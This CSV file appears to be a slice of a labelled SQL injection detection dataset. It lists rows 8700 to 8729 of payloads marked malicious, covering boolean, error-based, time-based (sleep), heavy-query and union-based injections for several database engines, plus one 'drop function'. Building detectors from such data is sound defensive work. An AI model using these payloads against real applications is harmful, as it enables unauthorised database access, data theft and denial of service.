row_index,payload_norm,label,sqli_type_hint
8700,"1"" ) where 1410 = 1410",1,
8701,1%' ) and 2006 = 2006,1,
8702,-2530%' order by 1#,1,
8703,"1 ) as svkf where 6503 = 6503 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
8704,select ( case when ( 2751 = 8206 ) then 2751 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
8705,1'+ ( select gguu where 7809 = 7809 union all select null--,1,
8706,-6512'+ ( select 'zdjx' where 5454 = 5454 order by 1--,1,
8707,"1%"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""%"" = """,1,
8708,"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
8709,"1%' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and '%' = '",1,
8710,"1%"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,1,
8711,select ( case when ( 9434 = 2780 ) then 9434 else 9434* ( select 9434 from information_schema.character_sets ) end ) #,1,
8712,1 where 6365 = 6365,1,
8713,1' ) ) ) union all select null#,1,
8714,"-3749"" or elt ( 1032 = 1032,3623 ) and ""mzrw"" = ""mzrw",1,
8715,if ( 9770 = 9748 ) select 9770 else drop function zyuo--,1,
8716,"1' ) and make_set ( 7187 = 4625,4625 ) and ( 'diai' like 'diai",1,
8717,end ) ||',1,
8718,"-3370' in boolean mode ) union all select 3432,3432,3432,3432#",1,
8719,"1' ) ) as fwxq where 9935 = 9935 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
8720,"1 ) where 2679 = 2679 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
8721,"1%"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
8722,"1%"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1,
8723,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1,
8724,"1 ) ) as krzi where 8727 = 8727 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
8725,1 ) or sleep ( 5 ) #,1,
8726,"1"" ) ) ) and sleep ( 5 ) #",1,
8727,1 where 7882 = 7882,1,
8728,"-3822"" ) ) as dftp where 2817 = 2817 union all select 2817,2817,2817,2817,2817,2817#",1,
8729,"-4032"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""olox"" = ""olox",1,
